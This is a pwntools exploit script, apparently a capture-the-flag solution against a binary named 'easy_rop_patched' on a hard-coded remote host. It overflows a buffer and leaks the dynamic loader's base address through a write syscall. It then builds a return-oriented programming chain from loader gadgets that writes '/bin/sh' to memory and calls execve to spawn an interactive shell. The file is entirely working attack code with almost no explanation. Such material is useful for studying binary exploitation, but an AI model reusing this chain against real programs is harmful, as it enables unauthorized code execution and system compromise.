from pwn import *

gs = '''
b *0x0000000000401129
continue
'''

elf = context.binary = ELF("./easy_rop_patched")
ld = ELF("./ld-2.40.so")

def start():
    if args.REMOTE:
        return remote("74.207.229.59", 20222)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

# El tope es 0x80

offset = 40

pop_rdi = 0x000000000040112e
syscall = 0x0000000000401126

payload = b"".join([
    b"A"*offset,
    p64(elf.sym.main),
    p64(pop_rdi),
    p64(0x1), # mov rdi, 1 ; stdout
    p64(0x0),  # mov rbp, 0x0
    p64(syscall),
    p64(0x0),
    p64(elf.sym.main)
    #p64(0x4343434343434343)
])

io.send(payload.ljust(0x80 - 8 , b"B"))

io.send(cyclic(0x1)) # For write = 0x1

io.recvuntil(b"B"*24)

leak_ld = u64(io.recv(8))

print(f"Leak Ld: {hex(leak_ld)}")

ld.addr = leak_ld - 0x3a000

print(f"Ld base: {hex(ld.addr)}")

pop_rax = ld.addr + 0x0000000000014f3c # pop rax ; ret
mov_qword_ptr_rsi_rax = ld.addr + 0x0000000000013a25 # mov qword ptr [rsi], rax ; ret
pop_rsi = ld.addr + 0x0000000000024a46 # pop rsi ; ret
data = 0x404000
sub_rdx_rax = ld.addr + 0x0000000000028d73 # sub rdx, rax ; jbe 0x28db0 ; add rax, rdi ; ret

print(f"pop rax: {hex(pop_rax)}")

payload = b"".join([
    b"A"*offset,
    p64(pop_rax),
    b"/bin/sh\x00",
    p64(pop_rsi),
    p64(data),
    p64(mov_qword_ptr_rsi_rax),
    p64(elf.sym.main)
])

io.send(payload)

payload = b"".join([
    b"A"*offset,
    p64(pop_rax),
    p64(0x80),
    p64(sub_rdx_rax),
    p64(pop_rdi),
    p64(0x404000),
    p64(0x0),
    p64(pop_rsi),
    p64(0x404100),
    p64(pop_rax),
    p64(0x3b),
    p64(syscall)
])

io.send(payload)

io.interactive()